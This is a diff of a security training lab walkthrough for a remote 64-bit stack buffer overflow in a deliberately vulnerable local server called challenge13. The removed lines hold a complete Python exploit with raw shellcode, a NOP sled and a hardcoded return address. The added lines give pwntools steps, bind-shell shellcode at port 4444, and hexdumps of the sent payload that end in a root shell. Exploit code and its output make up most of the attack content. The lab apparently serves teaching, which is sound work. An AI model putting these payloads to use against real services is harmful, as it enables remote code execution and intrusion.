@@ -3,7 +3,7 @@
 ## Introduction
 
 We will create a functional exploit for a remote 64bit program with a stack overflow vulnerability - 
-a remote exploit. 
+a remote server exploit. 
 
 
 ### Source
@@ -13,18 +13,15 @@ a remote exploit.
 
 You can compile it by calling `make` in the folder `~/challenges/challenge13`
 
-The source is similar to challenge12. Same vulnerability, but different input vector.
-Instead of giving the vulnerable data via stdin (or previously, command line arguments), we now
-send it via TCP/IP socket.
-
 
 ### Vulnerability
+
 
 The vulnerability lies here:
 
 ```
 void handleData(char *username, char *password) {
-    char name[128];
+    char name[256];
     ...
     strcpy(name, username);
     ...
@@ -42,6 +39,8 @@ void handleClient (int socket) {
 }
 ```
 
+The vulnerability is identical to challenge12, but with an increased buffer size (from 128 to 256 bytes)
+
 ## Usage
 
 The server expects two messages - similar to challenge12, but this time they
@@ -54,168 +53,179 @@ Password: test
 Not admin.
 ```
 
-But username overflows nevertheless. 
 
+## Writing the exploit
 
-## How to interact with server with python pwntools
-
-
-
-
-###########################################
-
-## Debugging notes
-
-### Hanging
-
-The program may hang. If you debug it again, you have to kill it:
-```
-root@hlUbuntu64:~/challenges/challenge13# ./challenge13
-ERROR on binding: Address already in use
-
-root@hlUbuntu64:~/challenges/challenge13# pkill challenge13
-root@hlUbuntu64:~/challenges/challenge13# pkill gdb  # for good measure
+Start our vulnerable server in the background:
+```sh
+~/challenges/challenge13$ ./challenge13 &
+[1] 5312
+~/challenges/challenge13$
 ```
 
-### Debug the server
 
-Set `follow-fork-mode child` in GDB to follow the children (should be enabled by default).
-
-Start the server in the background:
-```
-root@hlUbuntu64:~/challenges/challenge13# ./challenge13 &
-[1] 12345
-```
-
-Note the PID. Start gdb, and attach the the server (-parent). The process will be stopped, so we
-continue with `c`:
-```
-root@hlUbuntu64:~/challenges/challenge13# gdb -q
-gdb-peda$ attach 12345
-...
-gdb-peda$ c
-```
-
-The `attach` command is in the GDB command history.
-Reattach to the parent when the child crashed:
-
-Every time the server spawn a child, GDB will follow it. When you are finished debugging,
-and want to try the next version of the exploit, reattach and continue (`attach 12345` then `c`)
-
-
-## Finding the offset
-
-The offset should be 280. You should verify this by sending a payload, and obsever the output in GDB:
-```
-root@hlUbuntu64:~/challenges/challenge13# python -c 'import sys; sys.stdout.write("XXXX" + "A" * (280-4) + "BBBB"') | nc localhost 5001
-```
-Note we use `sys.stdout.write()` instead of `print()`, as the latter will always output a newline, while `write()` doesnt. There is also a extra
-pattern of "XXXX" at the beginning, which will be used shortly.
-
-Payload:
-```
-XXXXAAAAA...AAAAAABBBB
-```
-
-GDB will show something like:
-```
-RIP: 0x42424242 ('BBBB\n')
-...
-Stopped reason: SIGSEGV
-0x0000000042424242 in ?? ()
-```
-
-## Find the memory address
-
-The GDB plugin Peda provides a function to search the memory for a pattern. As we already have the
-child process crashed with out pattern in GDB, lets get the memory address:
-
-```
-gdb-peda$ find XXXX
-Searching for 'XXXX' in: None ranges
-Found 3 results, display max 3 items:
-   libc : 0x7ffff79626bc --> 0x2e00585858585858 ('XXXXXX')
-[stack] : 0x7fffffffdbf0 ("XXXX", 'A' <repeats 196 times>...)
-[stack] : 0x7fffffffe120 ("XXXX", 'A' <repeats 196 times>...)
-```
-
-Lets try the last one: `0x7fffffffe120`:
-
-```
-gdb-peda$ x/32x 0x7fffffffe120
-0x7fffffffe120: 0x58    0x58    0x58    0x58    0x41    0x41    0x41    0x41
-0x7fffffffe128: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0x7fffffffe130: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0x7fffffffe138: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-gdb-peda$ x/1s 0x7fffffffe120
-0x7fffffffe120: "XXXX", 'A' <repeats 196 times>...
-```
-
-Looking good.
-
-## Exploit
-
-Copy the file `challenge13-exp-skel.py`, open it and make the following changes.
-
-We use the shellcode address `0x7fffffffe120`. Convert the address with `[::-1]` in little-endian format.
+In python, connect to the server we wanna exploit with a pwntools tube:
 ```python
-ret_addr = "\x7f\xff\xff\xff\xe1\x20"[::-1]
+   io = remote("localhost", 5001)
+   gdb.attach(io, '''
+set follow-fork-mode child
+continue
+''')
+   io.send(pattern)
 ```
 
-Use the verified offset: `180`
+So instead of using `io = process("./challenge13")`, we connect to it with `io = remote("localhost", 5001)`.
+
+`gdb.attach()` will automagically attach itself to the parent process which listens
+on the given port. It is set to follow the spawned children.
+
+The screen will look the same as before: Split into top view with
+the script output, and the bottom view with GDB. As we wrote the command `continue` 
+in the second argument of `gdb.attach()`, no GDB input prompt will be shown 
+if no buffer overflow (crash) occured, as the process exits cleanly, and with it GDB.
+
+
+## Exploit writing tipp 0
+
+Try sending the data like this:
 ```
-offset = 280
-```
-
-Full exploit:
-```
-root@hlUbuntu64:~/challenges/challenge13# cat challenge13-exp-skel.py
-#!/usr/bin/python
-
-import sys
-import socket
-
-shellcode = "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef" + "\xff\xff\xff\x48\xbb\xd2\x44\xe6\x0a\xfb\xc8\x96\x10\x48" + "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb8\x6d\xbe" + "\x93\x91\xca\xc9\x7a\xd3\x1a\xe9\x0f\xb3\x5f\xc4\xd7\xd6" + "\x60\xe4\x0a\xea\x94\xde\x99\x34\x2e\xf6\x50\x91\xf9\xce" + "\x1f\xd7\x2e\xd4\x52\xf4\xcd\xde\x21\x24\x2e\xcd\x52\xf4" + "\xcd\xde\x87\xb8\x47\xb8\x42\x04\x06\xfc\x31\x8a\x4b\xe3" + "\x7f\x0d\xa2\xad\x48\x4b\x0c\x5d\x25\x99\xa1\xf8\x3f\xa1" + "\x2c\xe6\x59\xb3\x41\x71\x42\x85\x0c\x6f\xec\xf4\xcd\x96" + "\x10"
-
-buf_size = 256
-offset = 280
-ret_addr = "\x7f\xff\xff\xff\xe1\x20"[::-1]
-
-exploit = "\x90" * (buf_size - len(shellcode))
-exploit += shellcode
-exploit += "A" * (offset - len(exploit))
-exploit += ret_addr
-
-sys.stdout.write(exploit)
+io.sendafter(b"Username: ", pattern)
+io.sendafter(b"Password: ", b"password")
+io.recvall()
 ```
 
-Reattach GDB to the parent, and test it:
-```
-root@hlUbuntu64:~/challenges/challenge13# ./challenge13-exp.py | nc localhost 5001
+`io.recvall()` will basically wait until the process is exited. Without it (or something 
+similar like `io.interactive()`), the script would end quickly and takes GDB with it, making
+it impossible to use GDB. 
+
+Note that if a shell spawns, the process does not exit immediately! The script will block waiting
+for more data, and stuff will not work.
+
+
+## Exploit writing tipp 1
+
+Use the shellcode in `handleClient():username`. 
+
+
+## Exploit writing tipp 2
+
+You can set breakpoints in `gdb.attach()` - but be careful, `break *handleClient` will not work,
+as it is executed in the parent, and not the child we are debugging. 
 
 ```
-
-If everything works, the exploit will block. Open a new terminal, and connect
-to localhost:4444, where the shellcode started our shell:
-```
-root@hlUbuntu64:~/challenges/challenge13# nc -v localhost 4444
-nc: connect to localhost port 4444 (tcp) failed: Connection refused
-root@hlUbuntu64:~/challenges/challenge13# nc -v localhost 4444
-Connection to localhost 4444 port [tcp/*] succeeded!
-ls
-Makefile
-challenge13
-challenge13-exp-skel.py
-challenge13-exp.py
-challenge13.c
-peda-session-challenge13.txt
+   gdb.attach(io, '''
+set follow-fork-mode child
+break *handleClient+1
+continue
+'''
 ```
 
-Use nc parameter `-v` to know if it was able to connect or not.
-Note that there is no output if you just connect, you need to type in a command.
+
+## Exploit writing tipp 3
+
+Use the following shellcode:
+```
+s = shellcraft.amd64.linux.bindsh(4444, "ipv4")
+shellcode = asm(s)
+```
+
+And connect to the shell with:
+```
+ioShell = remote("localhost", 4444)
+ioShell.interactive()
+```
+
+by *REPLACING* the line:
+```
+io.recvall()
+```
 
 
-## Questions
+## Example Exploit
 
-* Can you make the exploit work, if the program is started standalone (without GDB)?
+Using the correct offset to generate a buffer overflow, it will look like this:
+```
+~/challenges/challenge13$ python3 challenge13-exploit.py --offset 280
+Dont forget to start the server in the background
+[+] Opening connection to localhost on port 5001: Done
+[*] running in new terminal: ['/usr/bin/gdb', '-q', '/root/challenges/challenge13/challenge13', '6285', '-x', '/tmp/pwnvvf4je2c.gdb']
+[+] Waiting for debugger: Done
+--[ Send pattern
+00000000  58 58 58 58  41 41 41 41  41 41 41 41  41 41 41 41  │XXXX│AAAA│AAAA│AAAA│
+00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000050  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000060  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000070  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000090  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000a0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000b0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000c0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000110  41 41 41 41  41 41 41 41  42 42 42 42               │AAAA│AAAA│BBBB│
+0000011c
+[┘] Receiving all data: 0B
+
+───────────────────────────────────────────────────────────────────────────────────────────────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x1
+$rbx   : 0x0
+$rcx   : 0x0
+$rdx   : 0x007fffffffe37c  →  0x0000000100000000
+$rsp   : 0x007fffffffe380  →  0x00007fff00000001
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x007fffffffe8b0  →  0x0000000000000000
+$rdi   : 0x007fffffffe260  →  "XXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rip   : 0x42424242
+────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge13", stopped 0x42424242 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+```
+
+And once it works:
+```
+~/challenges/challenge13$ python3 challenge13-exploit.py --offset 280 --address 0x7fffffffe790 NOPTRACE
+Dont forget to start the server in the background
+[+] Opening connection to localhost on port 5001: Done
+[!] Skipping debug attach since context.noptrace==True
+--[ Send exploit
+00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000010  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000030  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000050  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000060  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+00000070  90 90 90 90  90 90 90 90  90 90 6a 29  58 6a 02 5f  │····│····│··j)│Xj·_│
+00000080  6a 01 5e 99  0f 05 52 ba  01 01 01 01  81 f2 03 01  │j·^·│··R·│····│····│
+00000090  10 5d 52 6a  10 5a 48 89  c5 48 89 c7  6a 31 58 48  │·]Rj│·ZH·│·H··│j1XH│
+000000a0  89 e6 0f 05  6a 32 58 48  89 ef 6a 01  5e 0f 05 6a  │····│j2XH│··j·│^··j│
+000000b0  2b 58 48 89  ef 31 f6 99  0f 05 48 89  c5 6a 03 5e  │+XH·│·1··│··H·│·j·^│
+000000c0  48 ff ce 78  0b 56 6a 21  58 48 89 ef  0f 05 eb ef  │H··x│·Vj!│XH··│····│
+000000d0  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
+000000e0  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
+000000f0  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
+00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000110  41 41 41 41  41 41 41 41  90 e7 ff ff  ff 7f 00 00  │AAAA│AAAA│····│····│
+00000120
+[+] Opening connection to localhost on port 4444: Done
+[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$
+```
+
+## Things to think about
+
 * Instead of the listener shellcode, can you use a connect-back shellcode?
